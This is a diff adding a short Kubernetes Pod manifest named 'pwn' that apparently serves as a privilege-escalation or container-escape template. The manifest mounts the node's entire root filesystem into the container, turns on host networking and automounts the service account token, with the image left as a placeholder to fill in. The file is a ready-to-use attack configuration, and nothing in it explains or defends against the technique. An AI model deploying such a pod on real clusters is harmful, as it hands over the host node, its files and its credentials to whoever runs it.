@@ -1,0 +1,18 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwn
+  namespace: default
+spec:
+  containers:
+  - name: pwn
+    image: <ADD_IMAGE_HERE>
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
